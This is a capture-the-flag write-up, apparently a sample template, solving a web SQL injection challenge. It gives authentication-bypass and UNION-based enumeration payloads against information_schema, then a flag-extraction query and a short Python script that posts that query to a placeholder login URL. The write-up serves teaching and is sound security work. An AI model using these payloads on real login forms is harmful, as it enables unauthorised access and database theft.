# Sample SQL Injection Challenge

**Category:** Web  
**Points:** 100  
**Author:** Sample Author  
**Event:** Sample CTF 2024

## Description

A simple login page that appears vulnerable to SQL injection. Find the flag hidden in the database.

URL: `http://example.com/login`

## Solution

### Initial Analysis

Looking at the login page, I noticed it's asking for username and password. The page seems to be a basic PHP application with a MySQL backend. Let me test for SQL injection vulnerabilities.

### Steps

1. **Initial Testing**: Tried basic SQL injection payloads in the username field:
   - `admin' --`
   - `' OR 1=1 --`
   - `' UNION SELECT 1,2,3 --`

2. **Discovered Vulnerability**: The payload `' OR 1=1 --` successfully bypassed authentication, confirming SQL injection vulnerability.

3. **Database Enumeration**: Used UNION-based injection to enumerate the database:
   ```sql
   ' UNION SELECT 1,database(),version() --
   ```
   
   Result showed database name: `ctf_db`

4. **Table Discovery**: Found tables using:
   ```sql
   ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='ctf_db' --
   ```
   
   Found tables: `users`, `flags`

5. **Column Enumeration**: Discovered columns in the flags table:
   ```sql
   ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flags' --
   ```
   
   Found columns: `id`, `flag_value`

6. **Flag Extraction**: Retrieved the flag:
   ```sql
   ' UNION SELECT 1,flag_value,3 FROM flags --
   ```

### Key Insights

- The application didn't properly sanitize user input
- No prepared statements were used
- Error messages revealed database structure information
- Simple OR-based injection was sufficient for initial access

### Code/Scripts

```python
import requests

url = "http://example.com/login"
payload = "' UNION SELECT 1,flag_value,3 FROM flags --"

data = {
    'username': payload,
    'password': 'anything'
}

response = requests.post(url, data=data)
print(response.text)
```

### Flag

```
flag{sql_1nj3ct10n_1s_3asy}
```

## Tools Used

- Burp Suite Community Edition
- Python requests library
- Browser Developer Tools
- SQLMap (for verification)

## References

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Lessons Learned

- Always test for SQL injection in web applications
- UNION-based injection is powerful for data extraction
- Information schema tables are valuable for database enumeration
- Proper input validation and prepared statements prevent these attacks